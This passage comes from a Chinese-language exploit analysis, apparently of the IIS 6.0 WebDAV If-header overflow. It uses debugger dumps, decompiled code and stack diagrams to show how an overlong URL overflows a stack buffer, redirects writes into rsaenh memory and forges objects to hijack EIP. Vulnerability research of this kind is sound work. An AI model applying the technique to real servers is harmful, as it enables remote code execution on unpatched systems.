`CStackBuffer1.fake_heap_size` 被改写为 `0x02020202`、`CStackBuffer1.heap_buffer`
被改写为 `0x680312c0`。
    0:006> dds esp L3
    03faf7b4  077d8eb0      $$ http://localhost/aaaaaaa....
    03faf7b8  03faf804      $$ CStackBuffer1.buffer
    03faf7bc  03faf800      $$ 00000412 = ((0x104 * 4) | (0x82 & 3)) | 2
    $$ 留意最后面 2 个 DWORD 的值
    0:006> db ebp-430 L10C
    03faf804  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    03faf814  c0 59 55 03 00 00 00 00-00 10 08 00 60 f8 fa 03  .YU.........`...
    03faf824  fc f7 fa 03 f8 64 02 07-94 f8 fa 03 70 82 82 7c  .....d......p..|
    03faf834  a0 6e 87 7c 00 00 00 00-9c 6e 87 7c 00 00 00 00  .n.|.....n.|....
    03faf844  01 00 00 00 16 00 00 00-23 9f 87 7c 00 00 00 00  ........#..|....
    03faf854  c4 af 7b 04 02 00 00 01-00 00 00 00 04 5d 88 8a  ..{..........]..
    03faf864  6c 00 00 00 8c 1e 8f 60-82 1e 8f 60 02 00 00 00  l......`...`....
    03faf874  9a 1e 8f 60 34 fb fa 03-33 00 00 00 00 00 00 00  ...`4...3.......
    03faf884  8c 1e 8f 60 52 23 8f 60-22 00 00 00 00 00 00 00  ...`R#.`".......
    03faf894  00 00 00 00 00 00 00 00-01 00 00 00 0c 00 00 00  ................
    03faf8a4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    03faf8b4  f6 67 ca 77 00 00 00 00-00 00 00 00 00 00 00 00  .g.w............
    03faf8c4  00 00 00 00 00 00 00 00-20 f9 fa 03 4a b0 bc 77  ........ ...J..w
    03faf8d4  85 05 00 00 4f f9 fa 03-5b 20 11 67 5c b0 bc 77  ....O...[ .g\..w
    03faf8e4  5b 20 11 67 b0 72 bd 77-4f f9 fa 03 5b 20 11 67  [ .g.r.wO...[ .g
    03faf8f4  13 00 00 00 58 00 00 00-00 00 00 00 e8 64 02 07  ....X........d..
    03faf904  c0 17 bf 77 12 04 00 00-04 f8 fa 03              ...w........
                          ^^^^^^^^^^^ ~~~~~~~~~~~
    0:006> p
    eax=00000000 ebx=070fbfc0 ecx=0000e694 edx=03faf804 esi=00000001 edi=77bd8ef2
    eip=67125484 esp=03faf7c0 ebp=03fafc34 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!HrCheckIfHeader+0x15e:
    67125484 8bf0            mov     esi,eax
    $$ 留意最后面 2 个 DWORD 的值
    0:006> db ebp-430 L10C
    03faf804  63 00 3a 00 5c 00 69 00-6e 00 65 00 74 00 70 00  c.:.\.i.n.e.t.p.
    03faf814  75 00 62 00 5c 00 77 00-77 00 77 00 72 00 6f 00  u.b.\.w.w.w.r.o.
    03faf824  6f 00 74 00 5c 00 61 00-61 00 61 00 61 00 61 00  o.t.\.a.a.a.a.a.
    03faf834  61 00 61 00 68 6f 63 78-61 77 33 71 36 69 72 47  a.a.hocxaw3q6irG
    03faf844  39 7a 77 4b 70 4f 53 75-4f 7a 68 48 63 56 54 6d  9zwKpOSuOzhHcVTm
    03faf854  45 68 53 39 6c 50 67 55-63 67 64 33 30 46 45 78  EhS9lPgUcgd30FEx
    03faf864  52 69 31 54 58 4c 51 6a-41 72 31 42 35 70 50 58  Ri1TXLQjAr1B5pPX
    03faf874  64 36 47 6c 39 35 6a 54-34 50 43 54 52 77 61 50  d6Gl95jT4PCTRwaP
    03faf884  32 32 4b 6d 34 6c 47 32-41 62 4d 37 61 51 62 58  22Km4lG2AbM7aQbX
    03faf894  73 47 50 52 70 36 44 75-6a 68 74 33 4a 4e 6b 78  sGPRp6Dujht3JNkx
    03faf8a4  76 49 73 4e 6a 4c 7a 57-71 6f 4a 58 30 32 6e 37  vIsNjLzWqoJX02n7
    03faf8b4  49 4b 4d 52 63 48 4c 6f-56 75 75 75 6f 66 68 76  IKMRcHLoVuuuofhv
    03faf8c4  4d 44 70 50 36 7a 4b 62-57 65 50 75 72 6a 6b 7a  MDpP6zKbWePurjkz
    03faf8d4  62 77 58 76 48 62 31 65-54 30 79 6c 4a 50 62 54  bwXvHb1eT0ylJPbT
    03faf8e4  33 50 77 35 77 6a 44 41-34 33 76 64 46 4d 54 56  3Pw5wjDA43vdFMTV
    03faf8f4  6c 47 43 65 32 76 78 72-69 57 38 43 72 62 30 5a  lGCe2vxriW8Crb0Z
    03faf904  38 59 48 54 02 02 02 02-c0 12 03 68              8YHT.......h
                          ^^^^^^^^^^^ ~~~~~~~~~~~
### 3.3 填充数据
通过`!address` 命令可知地址 `0x680312c0` 位于 `rsaenh` 模块中，具备 `PAGE_READWRITE` 属性。
    0:006> !address 680312c0
    Failed to map Heaps (error 80004005)
    Usage:                  Image
    Allocation Base:        68000000
    Base Address:           68030000
    End Address:            68032000
    Region Size:            00002000
    Type:                   01000000    MEM_IMAGE
    State:                  00001000    MEM_COMMIT
    Protect:                00000004    PAGE_READWRITE
    More info:              lmv m rsaenh
    More info:              !lmi rsaenh
    More info:              ln 0x680312c0
    0:006> u 680312c0 L1
    rsaenh!g_pfnFree+0x4:
    680312c0 0000            add     byte ptr [eax],al
在解析 `http://localhost/bbbbbbb......` 时，数据将被直接填充到地址 `0x680312c0`。此时，由于
`CStackBuffer1` 的长度已经 **_足够大_** ，`ScStoragePathFromUrl` 只会被调用一次。
    $$ ScStoragePathFromUrl 参数
    0:006> dds esp L3
    03faf7b4  077dc9e0
    03faf7b8  680312c0 rsaenh!g_pfnFree+0x4
    03faf7bc  03faf800
    0:006> dd 03faf800 L1
    03faf800  00404040
    0:006> p
    eax=00000000 ebx=070fbfc0 ecx=0000e694 edx=680312c0 esi=00000000 edi=77bd8ef2
    eip=6712544a esp=03faf7c0 ebp=03fafc34 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!HrCheckIfHeader+0x124:
    6712544a 8bf0            mov     esi,eax
    $$ 填充数据到 0x680312c0
    0:006> db 680312c0
    680312c0  63 00 3a 00 5c 00 69 00-6e 00 65 00 74 00 70 00  c.:.\.i.n.e.t.p.
    680312d0  75 00 62 00 5c 00 77 00-77 00 77 00 72 00 6f 00  u.b.\.w.w.w.r.o.
    680312e0  6f 00 74 00 5c 00 62 00-62 00 62 00 62 00 62 00  o.t.\.b.b.b.b.b.
    680312f0  62 00 62 00 48 79 75 61-43 4f 67 6f 6f 6b 45 48  b.b.HyuaCOgookEH
    68031300  46 36 75 67 33 44 71 38-65 57 62 5a 35 54 61 56  F6ug3Dq8eWbZ5TaV
    68031310  52 69 53 6a 57 51 4e 38-48 59 55 63 71 49 64 43  RiSjWQN8HYUcqIdC
    68031320  72 64 68 34 58 47 79 71-6b 33 55 6b 48 6d 4f 50  rdh4XGyqk3UkHmOP
    68031330  46 7a 71 34 54 6f 43 74-56 59 6f 6f 41 73 57 34  Fzq4ToCtVYooAsW4
    0:006> db
    68031340  68 61 72 7a 45 37 49 4d-4e 57 48 54 38 4c 7a 36  harzE7IMNWHT8Lz6
    68031350  72 35 66 62 43 6e 6d 48-48 35 77 61 5a 4d 74 61  r5fbCnmHH5waZMta
    68031360  33 41 65 43 72 52 69 6d-71 36 64 4e 39 6e 53 63  3AeCrRimq6dN9nSc
    68031370  64 6b 46 51 30 4f 6f 78-53 72 50 67 53 45 63 7a  dkFQ0OoxSrPgSEcz
    68031380  39 71 53 4f 56 44 36 6f-79 73 77 68 56 7a 4a 61  9qSOVD6oyswhVzJa
    68031390  45 39 39 36 39 6c 31 45-72 34 65 53 4a 58 4e 44  E9969l1Er4eSJXND
    680313a0  44 7a 35 6c 56 5a 41 62-72 6e 31 66 59 59 33 54  Dz5lVZAbrn1fYY3T
    680313b0  42 31 65 58 41 59 50 71-36 30 77 57 57 44 61 53  B1eXAYPq60wWWDaS
    0:006> db
    680313c0  c0 13 03 68 4f 6e 00 68-4f 6e 00 68 47 42 6a 76  ...hOn.hOn.hGBjv
    680313d0  c0 13 03 68 57 42 74 4f-47 59 34 52 66 4b 42 4b  ...hWBtOGY4RfKBK
    680313e0  64 74 6f 78 82 60 01 68-35 51 7a 72 7a 74 47 4d  dtox.`.h5QzrztGM
    680313f0  59 44 57 57 13 b1 00 68-76 31 6f 6e e3 24 01 68  YDWW...hv1on.$.h
    68031400  60 14 03 68 00 03 fe 7f-ff ff ff ff c0 13 03 68  `..h...........h
    68031410  6e 04 03 68 6e 71 70 74-34 14 03 68 e7 29 01 68  n..hnqpt4..h.).h
    68031420  91 93 00 68 31 39 6e 66-55 49 52 30 6b 54 6b 76  ...h19nfUIR0kTkv
    68031430  4a 72 61 79 1c 14 03 68-05 6e 00 68 32 77 68 79  Jray...h.n.h2why
### 3.4 控制 EIP
在函数 `HrCheckIfHeader` 返回后，后面会跳转到 `CParseLockTokenHeader::HrGetLockIdForPath`
中去执行，而后者也会多次调用 `CMethUtil::ScStoragePathFromUrl` 这个函数。同样，解析 URL
第一部分（`http://localhost/aaaaaaa....`）时完成栈溢出，此时会覆盖到一个引用 `CMethUtil` 对象的局部变量；在解析
URL 第二部分（`http://localhost/bbbbbbb....`）时，因为 `CMethUtil` 已经伪造好，其成员 `IEcb`
实例同样完成伪造，最后在 `ScStripAndCheckHttpPrefix` 中实现 EIP 的控制。
    CPutRequest::Execute
    ├──HrCheckStateHeaders
    │  └──HrCheckIfHeader
    │     ├──CMethUtil::ScStoragePathFromUrl
    │     └──CMethUtil::ScStoragePathFromUrl
    │
    └──FGetLockHandle
       └──CParseLockTokenHeader::HrGetLockIdForPath
          ├──CMethUtil::ScStoragePathFromUrl
          └──CMethUtil::ScStoragePathFromUrl
**(1) FGetLockHandle 分析** 函数 `FGetLockHandle` 里面构造了一个 `CParseLockTokenHeader`
对象， **存储于栈上的一个局部变量引用了这个对象** （这一点很重要），调用该对象的成员函数 `HrGetLockIdForPath` 进入下一阶段。
    int __stdcall FGetLockHandle(
        struct CMethUtil *a1, wchar_t *Str, 
        unsigned __int32 a3, const unsigned __int16 *a4, 
        struct auto_ref_handle *a5)
    {
      signed int v5; // eax@1
      int result; // eax@2
      CParseLockTokenHeader *v7; // [sp+0h] [bp-54h]@1
      union _LARGE_INTEGER v8; // [sp+40h] [bp-14h]@1
      int v9; // [sp+50h] [bp-4h]@1
      v7 = CParseLockTokenHeader(a1, a4);
      v9 = 0;
      v7->SetPaths(Str, 0);
      v5 = v7->HrGetLockIdForPath(Str, a3, &v8, 0);
      v9 = -1;
      if ( v5 >= 0 )
      {
        result = FGetLockHandleFromId(a1, v8, Str, a3, a5);
      }
      else
      {
        result = 0;
      }
      return result;
    }
**(2) HrGetLockIdForPath 分析** `HrGetLockIdForPath` 与 `HrCheckIfHeader`
有点类似，同样存在两个 `CStackBuffer` 变量。不同的是，`v22.HighPart` 指向父级函数 `HrGetLockIdForPath`
中引用 `CParseLockTokenHeader` 对象的局部变量，而且这里也会将其转换为 `CMethUtil` 类型使用。
在解析 URL 第一部分（`http://localhost/aaaaaaa....`）时，通过栈溢出可以覆盖引用
`CParseLockTokenHeader` 对象的局部变量，栈布局如下所示。
    ┌─────────────────────────┐
    │   v7 (FGetLockHandle)   │  CParseLockTokenHeader  heap (url part1)│
    ├─────────────────────────┤                             │
    │         1.fake_heap_size│  ebp-124                    │
    ├─────────────────────────┤                             │
    │CStackBuffer1.buffer[260]│  ebp-228                    │
    ├─────────────────────────┤                             │
    │          ......         │                             │